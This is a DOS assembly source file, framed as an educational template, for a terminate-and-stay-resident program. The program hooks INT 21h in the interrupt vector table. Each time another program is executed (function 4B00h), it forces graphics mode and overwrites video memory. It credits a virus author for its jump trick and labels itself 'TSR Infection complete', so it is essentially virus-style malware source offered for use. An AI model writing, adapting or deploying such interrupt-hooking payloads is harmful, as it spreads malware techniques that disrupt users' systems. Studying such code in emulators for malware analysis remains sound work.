;model TINY		;masm specific
;.286			;masm specific

;******************************************************************************
;	Template for creating a COM Program that installs a TSR to the IVT
;	 
;	To be used in MS-DOS Emulator program 
;		(i.e. DOSBOX, FreeDOS in qemu, etc)
;	Must be compiled with a 16bit linker 
;		(i.e. ld86 or link16.exe with MASM32) 
;
;	This TSR is for educational purposes only.
;	Use at your own risk and practice at least some modicum of discretion
;
;******************************************************************************
;	assume CS:TEXT, DS:TEXT
bits 16
.text:
	org 100h

;******************************************************************************
;		Define macros here
;	
;******************************************************************************

;_start	PROC	NEAR 		; masm-specific
start:
	jmp 	setup_hook_interrupts

old_INT:
db	0EAh			;from Spanska Elvira, EAh is far call
_ORIG_INT	dd	? 	;this is also such a nice trick bc it avoids having to define these in a data segment
iret				;so there is no need to change the segment for loading cs w the correct value


hook_int:
	cmp	ax, 4B00h
	jne 	NO_INT
	pushf

NEW_INT:
	push 	ax
	push 	bx
	push	cx
	push	dx
	push	ds
	push	es
	push	si
	push	di
	
	;;do things here for new ISR xoxo
	cli
	mov	ax, 0013h
	int	10h
	mov	ax,0xA000
	mov	es,ax
	mov	di,0
	mov	cx, (6400/2)
	mov	ax,0202h
	cld
	repnz	stosw
	sti
	pop 	di
	pop	si
	pop	es
	pop	ds
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf

NO_INT:
	int 	85h
	push	ax
	mov	al, 0x20
	out	0x20, al
	pop	ax
	iret

setup_hook_interrupts:
	push es	
	mov	ax,0
	mov	es, ax
	es 	les bx,[0x84]			;;for int 21h
						;;es:bx contains contents of address 0x84 (0000:0084)
	mov	[_ORIG_INT], bx
	mov	[_ORIG_INT+2], es
	
	push 	es	
	pop 	ds
	mov	dx, bx				;ds:dx now == es:bx (seg:offset of int 21h)
	mov	ah, 0x25			;; new IVR (interrupt vector routine) installed
	mov 	al, 0x85			;; at IVT[0x85] or Interupt 21
	int	21h
	pop 	es

	mov 	cx, cs
	mov	ds, cx
	mov	dx, hook_int			;; address of TSR program passed in ds:dx
	mov	ah, 0x25			;; new IVR (interrupt vector routine) installed
	mov 	al, 0x21			;; at IVT[0x21] or Interupt 21
	int 	21h

install_tsr:
	mov	dx, ((256 + setup_hook_interrupts-start + 15) / 16)
	mov	ax, 0x3102
	int 	21h

b_msg	db	"TSR Infection complete", 0Dh,0Ah
b_len	equ	$-b_msg

;;_start	ENDP				;masm specific
;	;end	_start			;masm specific

